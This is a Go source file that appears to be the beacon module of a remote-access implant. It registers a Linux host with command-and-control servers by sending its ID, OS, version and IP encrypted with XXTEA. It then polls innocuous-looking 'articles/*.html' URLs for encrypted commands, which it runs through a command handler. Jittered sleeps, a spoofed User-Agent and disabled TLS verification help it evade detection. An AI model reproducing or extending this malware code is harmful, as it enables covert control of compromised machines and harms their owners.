package core

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var (
	RegisteredWithC2 bool   = false
	MyID            string = ""
)

func Ping(c2 string) bool {
	if strings.Contains(c2, "https://") {
		transport := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
		}
		c := http.Client{Transport: transport, Timeout: time.Duration(15) * time.Second}
		resp, err := c.Get(c2 + "ping?id=" + MyID)
		if err != nil {
			return false
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if string(body) == "pong" {
			return true
		}
	}
	return false
}

func GetSettingsC2() {
	for {
		for i := 0; i < len(C2); i++ {
			if Ping(C2[i]) {
				transport := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
				}
				client := http.Client{Transport: transport, Timeout: time.Duration(15) * time.Second}
				req, _ := http.NewRequest("GET", C2[i]+"articles/settings.html?id="+MyID, nil)
				req.Header.Set("User-Agent", UserAgent)
				resp, err := client.Do(req)
				if err == nil {
					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					decoded, _ := base64.RawURLEncoding.DecodeString(string(body))
					decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
					
					if string(decrypted) == "failed" {
						RegisteredWithC2 = false
						NewClientC2(C2[i])
					} else {
						RegisteredWithC2 = true
						// Logic to parse settings if needed
					}
				}
			}
		}
		time.Sleep(time.Duration(PingTime) * time.Minute)
	}
}

func NewClientC2(c2Url string) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
	}
	client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
	data := url.Values{}

	// Minimal client info for Linux
	info := map[string]string{
		"ID":      MyID,
		"OS":      "Linux",
		"Version": ClientVersion,
		"IP":      GetClientIP(),
	}
	res, _ := json.Marshal(info)
	encrypted := XXTeaEncrypt(res, []byte(EncryptionPassword))
	encoded := base64.RawURLEncoding.EncodeToString(encrypted)

	data.Add("id", MyID)
	data.Add("data", encoded)
	
	resp, err := client.PostForm(c2Url+"articles/new.html", data)
	if err == nil {
		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if strings.Contains(string(body), "success") {
			RegisteredWithC2 = true
		}
	}
}

func ReadC2() {
	for {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				transport := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
				}
				client := http.Client{Transport: transport, Timeout: time.Duration(15) * time.Second}
				req, _ := http.NewRequest("GET", C2[i]+"articles/read.html?id="+MyID, nil)
				req.Header.Set("User-Agent", UserAgent)
				resp, err := client.Do(req)
				if err == nil {
					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					decoded, _ := base64.RawURLEncoding.DecodeString(string(body))
					decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
					
					if len(decrypted) > 0 && string(decrypted) != "failed" {
						var cmd struct {
							Id         string
							DAT        string
							Parameters string
						}
						json.Unmarshal(decrypted, &cmd)
						go HandleCommands(cmd.Id, cmd.DAT, cmd.Parameters)
					}
				}
			}
		}
		// Jitter
		sleepTime := PingTime * 60 + rand.Intn(Jitter+1)
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}
